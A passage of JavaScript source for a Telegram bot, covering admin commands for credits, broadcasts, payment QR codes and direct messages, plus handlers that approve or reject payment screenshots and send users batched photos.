                    [{ text: '✅ Accept', callback_data: 'accept_payment_' + msg.from.id + '_' + paymentData.amount + '_' + paymentData.plan }],
                    [{ text: '❌ Reject', callback_data: 'reject_payment_' + msg.from.id }],
                    [{ text: '💬 DM User', callback_data: 'dm_user_' + msg.from.id }]
                ]
            };

            await S7.sendPhoto(config.adminId, fileId, {
                caption: caption,
                parse_mode: 'HTML',
                reply_markup: adminKeyboard
            });

            await S7.sendMessage(msg.from.id,
                '✅ <b>Screenshot forwarded to admin!</b>\n\n' +
                '📌 Plan: ' + paymentData.creditsText + '\n' +
                '💵 Amount: ₹' + paymentData.amount + '\n' +
                '🆔 Txn ID: ' + paymentData.txnId + '\n\n' +
                '⏳ Please wait for admin to verify and add credits.\n' +
                'You will be notified once credits are added.', {
                    parse_mode: 'HTML'
                }
            );

            logToFile('💰 Payment screenshot: ' + msg.from.id + ' - ₹' + paymentData.amount);
        }
    }
});

// ====================== ADMIN COMMANDS ======================
S7.on('message', async function(msg) {
    if (!msg.text || msg.from.id.toString() !== config.adminId) return;
    var text = msg.text.trim();

    // ====== ADD CREDITS ======
    if (text.startsWith('/addcredits')) {
        var parts = text.split(' ');
        if (parts.length < 3) return S7.sendMessage(msg.chat.id, '⚠️ Usage: /addcredits [userId] [amount]');

        var userId = parts[1];
        var amount = parseInt(parts[2]);
        if (isNaN(amount) || amount < 1) return S7.sendMessage(msg.chat.id, '⚠️ Enter valid amount');

        var user = getUser(userId);
        if (user.unlimited) return S7.sendMessage(msg.chat.id, '⚠️ User already has Unlimited!');

        user.credits = (user.credits || 0) + amount;
        saveUsers(getUsers());

        await S7.sendMessage(msg.chat.id, '✅ Added ' + amount + ' credits to user ' + userId + '\nNew balance: ' + user.credits);
        await S7.sendMessage(userId, '✅ <b>' + amount + ' credits added!</b>\n⭐ New balance: ' + user.credits, {
            parse_mode: 'HTML'
        });
        logToFile('💰 Admin added ' + amount + ' credits to ' + userId);
    }

    // ====== REMOVE CREDITS ======
    if (text.startsWith('/removecredits')) {
        var parts = text.split(' ');
        if (parts.length < 3) return S7.sendMessage(msg.chat.id, '⚠️ Usage: /removecredits [userId] [amount]');

        var userId = parts[1];
        var amount = parseInt(parts[2]);
        if (isNaN(amount) || amount < 1) return S7.sendMessage(msg.chat.id, '⚠️ Enter valid amount');

        var user = getUser(userId);
        if (user.unlimited) return S7.sendMessage(msg.chat.id, '⚠️ User has Unlimited! Cannot remove credits.');

        user.credits = Math.max(0, (user.credits || 0) - amount);
        saveUsers(getUsers());

        await S7.sendMessage(msg.chat.id, '✅ Removed ' + amount + ' credits from user ' + userId + '\nNew balance: ' + user.credits);
        await S7.sendMessage(userId, '⚠️ <b>' + amount + ' credits removed!</b>\n⭐ New balance: ' + user.credits, {
            parse_mode: 'HTML'
        });
        logToFile('💰 Admin removed ' + amount + ' credits from ' + userId);
    }

    // ====== UNLIMITED ======
    if (text.startsWith('/unlimited')) {
        var parts = text.split(' ');
        if (parts.length < 2) return S7.sendMessage(msg.chat.id, '⚠️ Usage: /unlimited [userId]');

        var userId = parts[1];
        var user = getUser(userId);
        user.unlimited = true;
        saveUsers(getUsers());

        await S7.sendMessage(msg.chat.id, '✅ Unlimited activated for user ' + userId);
        await S7.sendMessage(userId, '🎉 <b>UNLIMITED ACTIVATED!</b>\n\nYou now have unlimited credits forever!', {
            parse_mode: 'HTML'
        });
        logToFile('⭐ Unlimited activated for ' + userId);
    }

    // ====== STATS ======
    if (text === '/stats') {
        var users = getUsers();
        var totalUsers = Object.keys(users).length;
        var photos = getPhotos();
        var channels = getChannels();
        var referrals = getReferrals();
        var botInfo = await S7.getMe();

        var statsMsg = '📊 <b>Bot Statistics</b>\n\n' +
                       '👥 Total Users: ' + totalUsers + '\n' +
                       '📷 Total Photos: ' + photos.length + '\n' +
                       '📢 Total Channels: ' + channels.length + '\n' +
                       '👥 Total Referrals: ' + referrals.length + '\n' +
                       '⏱ Uptime: ' + getUptime() + '\n' +
                       '🤖 Bot: @' + botInfo.username;

        await S7.sendMessage(msg.chat.id, statsMsg, { parse_mode: 'HTML' });
    }

    // ====== BROADCAST ======
    if (text.startsWith('/broadcast')) {
        var message = text.replace('/broadcast', '').trim();
        if (!message) return S7.sendMessage(msg.chat.id, '⚠️ Usage: /broadcast [message]');

        var users = getUsers();
        var userIds = Object.keys(users);
        var sent = 0,
            failed = 0;

        await S7.sendMessage(msg.chat.id, '📢 Broadcasting to ' + userIds.length + ' users...');

        for (var i = 0; i < userIds.length; i++) {
            try {
                await S7.sendMessage(userIds[i], '📢 <b>Announcement</b>\n\n' + message + '\n\n- Bot Admin', {
                    parse_mode: 'HTML'
                });
                sent++;
            } catch (e) {
                failed++;
            }
            await new Promise(function(r) { setTimeout(r, 50); });
        }

        await S7.sendMessage(msg.chat.id, '✅ Broadcast complete!\n✅ Sent: ' + sent + '\n❌ Failed: ' + failed);
        logToFile('📢 Broadcast sent to ' + sent + ' users');
    }

    // ====== ADD QR ======
    if (text === '/addqr') {
        var user = getUser(msg.from.id);
        user._waitingForQR = true;
        saveUsers(getUsers());
        await S7.sendMessage(msg.chat.id, '📱 <b>Upload QR Code</b>\n\nPlease send the QR code image as a photo.\nThe QR code will be used for payments.', {
            parse_mode: 'HTML'
        });
    }

    // ====== REMOVE QR ======
    if (text === '/removeqr') {
        if (fs.existsSync(QR_FILE)) {
            fs.unlinkSync(QR_FILE);
            await S7.sendMessage(msg.chat.id, '✅ QR code removed successfully!');
            logToFile('📱 QR code removed');
        } else {
            await S7.sendMessage(msg.chat.id, '❌ No QR code found to remove.');
        }
    }

    // ====== VIEW QR ======
    if (text === '/viewqr') {
        if (fs.existsSync(QR_FILE)) {
            await S7.sendPhoto(msg.chat.id, QR_FILE, {
                caption: '📱 <b>Current QR Code</b>\n\nUse this for payments.',
                parse_mode: 'HTML'
            });
        } else {
            await S7.sendMessage(msg.chat.id, '❌ No QR code uploaded yet. Use /addqr to upload.');
        }
    }

    // ====== RESTART ======
    if (text === '/restart') {
        await S7.sendMessage(msg.chat.id, '🔄 Restarting bot...');
        logToFile('🔄 Bot restarting');
        process.exit(0);
    }
});

// ====================== QR CODE UPLOAD HANDLER ======================
S7.on('message', async function(msg) {
    if (!msg.photo) return;
    var isAdmin = msg.from.id.toString() === config.adminId;
    if (!isAdmin) return;

    var user = getUser(msg.from.id);
    if (user._waitingForQR) {
        try {
            var fileId = msg.photo[msg.photo.length - 1].file_id;
            var fileLink = await S7.getFileLink(fileId);
            var response = await fetch(fileLink);
            var buffer = await response.arrayBuffer();
            fs.writeFileSync(QR_FILE, Buffer.from(buffer));
            delete user._waitingForQR;
            saveUsers(getUsers());

            await S7.sendMessage(msg.chat.id, '✅ <b>QR Code Uploaded Successfully!</b>\n\n📱 Users can now scan this QR for payments.\nUse /viewqr to see it.', {
                parse_mode: 'HTML'
            });
            logToFile('📱 QR code uploaded');
        } catch (err) {
            console.error('QR Upload Error:', err);
            await S7.sendMessage(msg.chat.id, '❌ Failed to upload QR code. Please try again.');
        }
    }
});

// ====================== ADMIN PAYMENT ACTION HANDLERS ======================
S7.on('callback_query', async function(q) {
    var isAdmin = q.from.id.toString() === config.adminId;
    if (!isAdmin) {
        await S7.answerCallbackQuery(q.id, { text: '⚠️ Admin only!', show_alert: true });
        return;
    }

    // ====== ACCEPT PAYMENT ======
    if (q.data.startsWith('accept_payment_')) {
        var parts = q.data.split('_');
        var userId = parts[2];
        var amount = parseInt(parts[3]);
        var plan = parts[4] || 'custom';

        var user = getUser(userId);
        if (plan === 'unlimited') {
            user.unlimited = true;
            await S7.sendMessage(userId, '🎉 <b>UNLIMITED ACTIVATED!</b>\n\nYour payment of ₹' + amount + ' has been verified.\nYou now have unlimited credits forever!', {
                parse_mode: 'HTML'
            });
        } else {
            user.credits = (user.credits || 0) + amount;
            saveUsers(getUsers());
            await S7.sendMessage(userId, '✅ <b>Payment Verified!</b>\n\n' + amount + ' credits have been added to your account.\n⭐ New balance: ' + user.credits, {
                parse_mode: 'HTML'
            });
        }

        // Clear pending payment
        if (user._pendingPayment) {
            delete user._pendingPayment;
            saveUsers(getUsers());
        }

        await S7.editMessageCaption(
            '💰 <b>Payment Approved ✅</b>\n\n' +
            '👤 User: @' + (q.from.username || 'user_' + userId) + '\n' +
            '🆔 ID: <code>' + userId + '</code>\n' +
            '💵 Amount: ₹' + amount + '\n' +
            '📊 Plan: ' + (plan === 'unlimited' ? '♾️ Unlimited' : amount + ' Credits') + '\n\n' +
            '✅ <b>Credits added successfully!</b>', {
                chat_id: q.message.chat.id,
                message_id: q.message.message_id,
                parse_mode: 'HTML'
            }
        );

        await S7.answerCallbackQuery(q.id, { text: '✅ Payment accepted! Credits added.' });
        logToFile('💰 Admin accepted payment for ' + userId + ' - ₹' + amount);
        return;
    }

    // ====== REJECT PAYMENT ======
    if (q.data.startsWith('reject_payment_')) {
        var userId = q.data.replace('reject_payment_', '');

        var user = getUser(userId);
        if (user._pendingPayment) {
            var paymentData = user._pendingPayment;
            await S7.sendMessage(userId, '❌ <b>Payment Rejected</b>\n\n' +
                'Your payment of ₹' + paymentData.amount + ' was not verified.\n' +
                'Please contact admin for assistance.', {
                    parse_mode: 'HTML'
                }
            );
            delete user._pendingPayment;
            saveUsers(getUsers());
        }

        await S7.editMessageCaption(
            '💰 <b>Payment Rejected ❌</b>\n\n' +
            '👤 User: @' + (q.from.username || 'user_' + userId) + '\n' +
            '🆔 ID: <code>' + userId + '</code>\n\n' +
            '❌ Payment was rejected.', {
                chat_id: q.message.chat.id,
                message_id: q.message.message_id,
                parse_mode: 'HTML'
            }
        );

        await S7.answerCallbackQuery(q.id, { text: '❌ Payment rejected.' });
        logToFile('💰 Admin rejected payment for ' + userId);
        return;
    }

    // ====== DM USER ======
    if (q.data.startsWith('dm_user_')) {
        var userId = q.data.replace('dm_user_', '');
        await S7.sendMessage(q.message.chat.id,
            '💬 <b>DM User</b>\n\n' +
            'User ID: <code>' + userId + '</code>\n' +
            'Send your message as reply to this command:\n\n' +
            '<code>/dm ' + userId + ' [your message]</code>', {
                parse_mode: 'HTML'
            }
        );
        await S7.answerCallbackQuery(q.id, { text: '📩 Use /dm command to send message.' });
        return;
    }
});

// ====================== DM COMMAND ======================
S7.on('message', async function(msg) {
    if (!msg.text || msg.from.id.toString() !== config.adminId) return;
    var text = msg.text.trim();

    if (text.startsWith('/dm')) {
        var parts = text.split(' ');
        if (parts.length < 3) {
            return S7.sendMessage(msg.chat.id, '⚠️ Usage: /dm [userId] [message]');
        }

        var userId = parts[1];
        var message = parts.slice(2).join(' ');

        try {
            await S7.sendMessage(userId, '📩 <b>Message from Admin:</b>\n\n' + message, {
                parse_mode: 'HTML'
            });
            await S7.sendMessage(msg.chat.id, '✅ Message sent to user ' + userId);
            logToFile('📩 Admin DM to ' + userId + ': ' + message);
        } catch (e) {
            await S7.sendMessage(msg.chat.id, '❌ Failed to send message. User may have blocked the bot.');
        }
    }
});

// ====================== BACKGROUND PROCESS (FAST) ======================
setInterval(function() {
    var userIds = Object.keys(pendingPhotos);
    var now = Date.now();
    for (var i = 0; i < userIds.length; i++) {
        var userId = userIds[i];
        if (pendingPhotos[userId] && pendingPhotos[userId].length > 0) {
            var shouldSend = false;
            var lastActive = userActive[userId] || 0;
            if ((now - lastActive) > 2000 || pendingPhotos[userId].length >= 20) {
                shouldSend = true;
            }
            if (shouldSend) {
                sendBatchPhotos(userId);
            }
        }
    }
}, 2000);

// ====================== START SERVER ======================
app.listen(config.port, function() {
    console.log('✅ Server running on port ' + config.port);
    console.log('📌 Admin Panel: http://localhost:' + config.port + '/admin');
    console.log('📌 Base URL: ' + config.baseUrl);
    console.log('🤖 Bot is ready! Send /start to begin.');
    console.log('⚡ FAST MODE: 100 photos in ~4 seconds!');
    console.log('🔴 ALL BUTTONS ARE PINK/RED (DANGER STYLE)!');
});

// ====================== ERROR HANDLING ======================
process.on('uncaughtException', function(err) {
    console.error('❌ Uncaught Exception:', err.message);
    logToFile('❌ Uncaught Exception: ' + err.message);
});

process.on('unhandledRejection', function(reason) {
    console.error('❌ Unhandled Rejection:', reason);
    logToFile('❌ Unhandled Rejection: ' + reason);
});
